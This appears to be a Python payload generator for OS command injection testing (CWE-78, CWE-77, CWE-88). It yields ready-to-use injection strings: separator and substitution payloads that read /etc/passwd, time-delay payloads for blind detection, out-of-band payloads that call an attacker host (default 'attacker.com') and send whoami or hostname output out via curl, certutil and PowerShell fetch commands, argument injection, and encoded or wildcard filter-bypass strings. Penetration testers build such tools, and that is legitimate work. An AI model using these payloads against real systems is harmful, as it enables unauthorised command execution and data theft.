"""
Command injection payload generators for OS Command Injection testing.

Payloads organized by:
- Detection type (direct, time-based, out-of-band)
- Platform (linux, windows, generic)
- Injection context (separators, substitution, arguments)

CWE Coverage: CWE-78, CWE-77, CWE-88
"""

from typing import Generator


def direct_payloads(platform: str = "linux") -> Generator[dict, None, None]:
    """
    Payloads for direct command injection (output visible in response).
    CWE-78: OS Command Injection.

    Args:
        platform: Target platform ('linux', 'windows', 'generic')
    """
    linux_payloads = [
        # Semicolon separator
        {"payload": "; id", "separator": ";", "command": "id"},
        {"payload": "; whoami", "separator": ";", "command": "whoami"},
        {"payload": "; hostname", "separator": ";", "command": "hostname"},
        {"payload": "; cat /etc/passwd", "separator": ";", "command": "cat"},
        # Pipe
        {"payload": "| id", "separator": "|", "command": "id"},
        {"payload": "| whoami", "separator": "|", "command": "whoami"},
        # OR operator
        {"payload": "|| id", "separator": "||", "command": "id"},
        # AND operator
        {"payload": "&& id", "separator": "&&", "command": "id"},
        # Background
        {"payload": "& id", "separator": "&", "command": "id"},
        # Backtick substitution
        {"payload": "`id`", "separator": "``", "command": "id"},
        {"payload": "`whoami`", "separator": "``", "command": "whoami"},
        # Dollar-paren substitution
        {"payload": "$(id)", "separator": "$()", "command": "id"},
        {"payload": "$(whoami)", "separator": "$()", "command": "whoami"},
        # Newline
        {"payload": "%0aid", "separator": "newline", "command": "id"},
        {"payload": "\nid", "separator": "newline", "command": "id"},
    ]

    windows_payloads = [
        # Ampersand separator
        {"payload": "& dir", "separator": "&", "command": "dir"},
        {"payload": "& whoami", "separator": "&", "command": "whoami"},
        {"payload": "& hostname", "separator": "&", "command": "hostname"},
        {"payload": "& type C:\\windows\\win.ini", "separator": "&", "command": "type"},
        # Pipe
        {"payload": "| dir", "separator": "|", "command": "dir"},
        {"payload": "| whoami", "separator": "|", "command": "whoami"},
        # OR operator
        {"payload": "|| dir", "separator": "||", "command": "dir"},
        # AND operator
        {"payload": "&& dir", "separator": "&&", "command": "dir"},
    ]

    if platform == "linux":
        yield from linux_payloads
    elif platform == "windows":
        yield from windows_payloads
    else:
        yield from linux_payloads
        yield from windows_payloads


def time_based_payloads(
    delay: int = 5, platform: str = "linux"
) -> Generator[dict, None, None]:
    """
    Payloads for blind command injection via time delays.
    CWE-78: Blind OS Command Injection.

    Args:
        delay: Delay duration in seconds
        platform: Target platform ('linux', 'windows', 'generic')
    """
    linux_payloads = [
        # Sleep variations
        {"payload": f"; sleep {delay}", "separator": ";", "delay": delay},
        {"payload": f"| sleep {delay}", "separator": "|", "delay": delay},
        {"payload": f"|| sleep {delay}", "separator": "||", "delay": delay},
        {"payload": f"&& sleep {delay}", "separator": "&&", "delay": delay},
        {"payload": f"`sleep {delay}`", "separator": "``", "delay": delay},
        {"payload": f"$(sleep {delay})", "separator": "$()", "delay": delay},
        {"payload": f"& sleep {delay} &", "separator": "&", "delay": delay},
        # Ping-based delay
        {
            "payload": f"; ping -c {delay} 127.0.0.1",
            "separator": ";",
            "delay": delay,
            "method": "ping",
        },
        {
            "payload": f"| ping -c {delay} 127.0.0.1",
            "separator": "|",
            "delay": delay,
            "method": "ping",
        },
    ]

    windows_payloads = [
        # Timeout (requires /t for seconds)
        {"payload": f"& timeout /t {delay}", "separator": "&", "delay": delay},
        {"payload": f"| timeout /t {delay}", "separator": "|", "delay": delay},
        # Ping-based delay (ping -n count in Windows, ~1sec per ping)
        {
            "payload": f"& ping -n {delay + 1} 127.0.0.1",
            "separator": "&",
            "delay": delay,
            "method": "ping",
        },
        {
            "payload": f"| ping -n {delay + 1} 127.0.0.1",
            "separator": "|",
            "delay": delay,
            "method": "ping",
        },
    ]

    powershell_payloads = [
        {
            "payload": f"; Start-Sleep -Seconds {delay}",
            "separator": ";",
            "delay": delay,
            "shell": "powershell",
        },
        {
            "payload": f"| Start-Sleep -s {delay}",
            "separator": "|",
            "delay": delay,
            "shell": "powershell",
        },
    ]

    if platform == "linux":
        yield from linux_payloads
    elif platform == "windows":
        yield from windows_payloads
        yield from powershell_payloads
    else:
        yield from linux_payloads
        yield from windows_payloads


def oob_payloads(callback_url: str, platform: str = "linux") -> Generator[dict, None, None]:
    """
    Payloads for blind command injection via out-of-band callbacks.
    CWE-78: OOB Command Injection.

    Args:
        callback_url: Attacker-controlled callback URL
        platform: Target platform ('linux', 'windows', 'generic')
    """
    # Extract domain from URL for DNS-based payloads
    domain = callback_url.replace("http://", "").replace("https://", "").split("/")[0]

    linux_payloads = [
        # DNS callbacks
        {"payload": f"; nslookup {domain}", "type": "dns", "separator": ";"},
        {"payload": f"| nslookup {domain}", "type": "dns", "separator": "|"},
        {"payload": f"`nslookup {domain}`", "type": "dns", "separator": "``"},
        {"payload": f"$(nslookup {domain})", "type": "dns", "separator": "$()"},
        {"payload": f"; host {domain}", "type": "dns", "separator": ";"},
        {"payload": f"; dig {domain}", "type": "dns", "separator": ";"},
        # HTTP callbacks
        {"payload": f"; curl {callback_url}/", "type": "http", "separator": ";"},
        {"payload": f"| curl {callback_url}/", "type": "http", "separator": "|"},
        {"payload": f"; wget {callback_url}/", "type": "http", "separator": ";"},
        {"payload": f"$(curl {callback_url}/)", "type": "http", "separator": "$()"},
        # HTTP with data exfiltration
        {
            "payload": f"; curl {callback_url}/?d=$(whoami)",
            "type": "http_exfil",
            "separator": ";",
        },
        {
            "payload": f"$(curl {callback_url}/?d=$(hostname))",
            "type": "http_exfil",
            "separator": "$()",
        },
    ]

    windows_payloads = [
        # DNS callbacks
        {"payload": f"& nslookup {domain}", "type": "dns", "separator": "&"},
        {"payload": f"| nslookup {domain}", "type": "dns", "separator": "|"},
        # Certutil for HTTP (common on Windows)
        {
            "payload": f"& certutil -urlcache -f {callback_url}/test.txt test.txt",
            "type": "http",
            "separator": "&",
        },
        # PowerShell HTTP
        {
            "payload": f"& powershell -c \"Invoke-WebRequest {callback_url}/\"",
            "type": "http",
            "separator": "&",
            "shell": "powershell",
        },
    ]

    if platform == "linux":
        yield from linux_payloads
    elif platform == "windows":
        yield from windows_payloads
    else:
        yield from linux_payloads
        yield from windows_payloads


def argument_payloads() -> Generator[dict, None, None]:
    """
    Payloads for argument injection (CWE-88).
    Inject arguments to modify command behavior.
    """
    payloads = [
        {"payload": "--help", "type": "help", "description": "Reveal command options"},
        {"payload": "-h", "type": "help", "description": "Reveal command options"},
        {"payload": "--version", "type": "version", "description": "Reveal version"},
        {"payload": "-v", "type": "verbose", "description": "Enable verbose output"},
        {"payload": "-vvv", "type": "verbose", "description": "Maximum verbosity"},
        {
            "payload": "--output=/tmp/test",
            "type": "output",
            "description": "Redirect output to file",
        },
        {
            "payload": "-o /tmp/test",
            "type": "output",
            "description": "Redirect output to file",
        },
        {
            "payload": "--config=/etc/passwd",
            "type": "config",
            "description": "Read arbitrary config file",
        },
        {
            "payload": "-c /etc/passwd",
            "type": "config",
            "description": "Read arbitrary config file",
        },
    ]
    yield from payloads


def filter_bypass_payloads(platform: str = "linux") -> Generator[dict, None, None]:
    """
    Payloads designed to bypass common command injection filters.
    CWE-78: Filter bypass techniques.

    Args:
        platform: Target platform
    """
    linux_payloads = [
        # Space bypass using IFS
        {"payload": "cat${IFS}/etc/passwd", "bypass": "space_ifs"},
        {"payload": "{cat,/etc/passwd}", "bypass": "space_brace"},
        {"payload": "cat$IFS/etc/passwd", "bypass": "space_ifs"},
        # Quote insertion
        {"payload": "w'h'o'am'i", "bypass": "single_quote"},
        {"payload": 'w"h"o"am"i', "bypass": "double_quote"},
        # Slash bypass using variable
        {"payload": "cat ${HOME:0:1}etc${HOME:0:1}passwd", "bypass": "slash_var"},
        # Base64 encoding
        {
            "payload": "$(echo d2hvYW1p | base64 -d)",
            "bypass": "base64",
            "decoded": "whoami",
        },
        {
            "payload": "`echo aWQ= | base64 -d`",
            "bypass": "base64",
            "decoded": "id",
        },
        # Hex encoding
        {"payload": "$(printf '\\x69\\x64')", "bypass": "hex", "decoded": "id"},
        # Wildcard bypass
        {"payload": "/???/??t /???/p??s??", "bypass": "wildcard", "decoded": "/bin/cat /etc/passwd"},
        # Concatenation
        {"payload": "wh''oami", "bypass": "empty_quote"},
        {"payload": 'wh""oami', "bypass": "empty_quote"},
    ]

    windows_payloads = [
        # Caret escape
        {"payload": "who^ami", "bypass": "caret"},
        {"payload": "^w^h^o^a^m^i", "bypass": "caret"},
        # Quote bypass
        {"payload": 'who""ami', "bypass": "empty_quote"},
        # Variable expansion
        {"payload": "%COMSPEC:~-3%", "bypass": "variable", "decoded": "cmd"},
    ]

    if platform == "linux":
        yield from linux_payloads
    elif platform == "windows":
        yield from windows_payloads
    else:
        yield from linux_payloads
        yield from windows_payloads


def get_all_payloads(
    callback_url: str = "http://attacker.com", platform: str = "linux"
) -> Generator[dict, None, None]:
    """Yield all command injection payloads."""
    yield from direct_payloads(platform)
    yield from time_based_payloads(delay=5, platform=platform)
    yield from oob_payloads(callback_url, platform)
    yield from argument_payloads()
    yield from filter_bypass_payloads(platform)


# Detection patterns for command output
LINUX_OUTPUT_PATTERNS = [
    r"uid=\d+",  # id command output
    r"root:.*:0:0:",  # /etc/passwd
    r"www-data|apache|nginx|nobody",  # common web user
    r"Linux version",  # uname output
    r"/bin/bash|/bin/sh",  # shell paths
]

WINDOWS_OUTPUT_PATTERNS = [
    r"Volume in drive",  # dir output
    r"Directory of",  # dir output
    r"\[fonts\]|\[extensions\]",  # win.ini
    r"NT AUTHORITY\\",  # whoami output
    r"Microsoft Windows",  # ver output
]


if __name__ == "__main__":
    print("=== Command Injection Payloads ===\n")

    print("Direct Payloads (Linux):")
    for i, p in enumerate(list(direct_payloads("linux"))[:5], 1):
        print(f"  {i}. {p['payload']} (separator: {p['separator']})")

    print("\nTime-Based Payloads (Linux):")
    for i, p in enumerate(list(time_based_payloads(5, "linux"))[:5], 1):
        print(f"  {i}. {p['payload']} (delay: {p['delay']}s)")

    print("\nOOB Payloads:")
    for i, p in enumerate(list(oob_payloads("http://attacker.com", "linux"))[:5], 1):
        print(f"  {i}. {p['payload']} (type: {p['type']})")

    print("\nFilter Bypass Payloads:")
    for i, p in enumerate(list(filter_bypass_payloads("linux"))[:5], 1):
        print(f"  {i}. {p['payload']} (bypass: {p['bypass']})")
